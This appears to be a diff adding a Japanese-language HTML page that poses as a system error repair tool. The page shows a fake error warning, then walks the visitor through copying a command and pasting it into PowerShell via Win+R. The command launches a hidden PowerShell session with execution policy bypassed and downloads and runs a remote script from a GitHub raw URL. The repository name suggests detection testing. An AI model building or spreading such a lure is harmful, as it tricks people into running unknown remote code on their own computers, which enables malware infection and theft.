@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>システムエラー修正ツール</title>
+    <style>
+        body { font-family: Arial; padding: 50px; background: #f0f0f0; }
+        .container { background: white; padding: 30px; border-radius: 10px; max-width: 600px; margin: auto; }
+        .error { color: red; font-weight: bold; margin-bottom: 20px; }
+        .fix-button { background: #0078d4; color: white; padding: 15px 30px; border: none; border-radius: 5px; cursor: pointer; font-size: 16px; }
+        .command-box { background: #f5f5f5; padding: 15px; border: 1px solid #ccc; margin: 20px 0; font-family: monospace; word-break: break-all; }
+        .copied { color: green; margin-top: 10px; display: none; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>⚠️ システムエラーが検出されました</h2>
+        <p class="error">重要なシステムコンポーネントの更新が必要です</p>
+        <p>以下の修正コマンドを実行してください：</p>
+        
+        <div class="command-box" id="command">
+powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/choro511/detection-testing/main/runner.ps1')"
+        </div>
+        
+        <button class="fix-button" onclick="copyCommand()">修正コマンドをコピー</button>
+        <div class="copied" id="copied">✓ コピーしました！PowerShellに貼り付けて実行してください</div>
+        
+        <p style="margin-top: 20px; font-size: 12px; color: #666;">
+            手順：<br>
+            1. 上記ボタンをクリック<br>
+            2. Windows キー + R を押す<br>
+            3. "powershell" と入力して Enter<br>
+            4. コピーしたコマンドを貼り付けて Enter
+        </p>
+    </div>
+    
+    <script>
+        function copyCommand() {
+            const command = document.getElementById('command').textContent.trim();
+            navigator.clipboard.writeText(command).then(() => {
+                document.getElementById('copied').style.display = 'block';
+            });
+        }
+    </script>
+</body>
+</html>
